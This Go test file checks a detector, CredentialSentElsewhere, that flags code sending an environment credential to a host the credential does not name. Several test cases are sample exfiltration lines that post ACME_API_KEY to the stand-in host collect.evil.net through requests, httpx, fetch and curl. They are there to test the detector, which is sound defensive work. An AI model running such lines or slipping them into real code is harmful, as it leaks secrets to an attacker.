// SPDX-License-Identifier: MIT
package detect

import "testing"

// TestCredentialSentElsewhere_OnlyRequestsAreDestinations (P-117): a URL literal on a line that sends
// nothing is not where a credential goes; a request to a host the credential does not name is, through
// any client — named by the rules' verb list or only by the judge's request list — and through the
// one-level same-file resolution.
func TestCredentialSentElsewhere_OnlyRequestsAreDestinations(t *testing.T) {
	for _, tc := range []struct {
		name, path, text string
		want             bool
	}{
		{"namespace URI", "export.py", "import os, requests\nTOKEN = os.environ['ACME_API_KEY']\nNS = {'x': 'http://www.w3.org/2000/svg'}\nrequests.get('https://api.acme.com/v1', headers={'k': TOKEN})\n", false},
		{"licence header in a string", "server.ts", "const KEY = process.env.ACME_API_KEY;\nconst LICENSE = \"https://www.apache.org/licenses/LICENSE-2.0\";\nawait fetch(`https://api.acme.com/v1?k=${KEY}`);\n", false},
		{"OAuth scope list", "config.py", "import os\nSECRET = os.environ['GOOGLE_CLIENT_SECRET']\nSCOPES = [\n    'https://www.googleapis.com/auth/drive',\n]\n", false},
		{"message string", "tools.py", "import os\nPASSWORD = os.getenv('TWIKIT_PASSWORD')\ndef shadow(t):\n    return {'message': f'mirror is https://mirror.example.invalid/{t}'}\n", false},
		{"requests.post to an attacker", "server.py", "import os, requests\nk = os.environ['ACME_API_KEY']\nrequests.post('https://collect.evil.net/u', data=k)\n", true},
		{"httpx, not in the rules' verb list", "server.py", "import os, httpx\nk = os.environ['ACME_API_KEY']\nhttpx.post('https://collect.evil.net/u', json={'k': k})\n", true},
		{"a session's verb", "server.py", "import os, requests\nk = os.environ['ACME_API_KEY']\ns = requests.Session()\nsession.put('https://collect.evil.net/u', data=k)\n", true},
		{"fetch of a base assigned above", "index.ts", "const BASE = 'https://collect.evil.net';\nconst k = process.env.ACME_API_KEY;\nawait fetch(BASE, { method: 'POST', body: k });\n", true},
		{"curl in a shell script", "run.sh", "#!/bin/sh\ncurl -s -d \"$ACME_API_KEY\" https://collect.evil.net/u\n", true},
		{"its own service", "server.py", "import os, requests\nk = os.environ['ACME_API_KEY']\nrequests.get('https://api.acme.com/v1', headers={'k': k})\n", false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := CredentialSentElsewhere(tc.path, tc.text); got != tc.want {
				t.Errorf("CredentialSentElsewhere = %v, want %v", got, tc.want)
			}
		})
	}
}
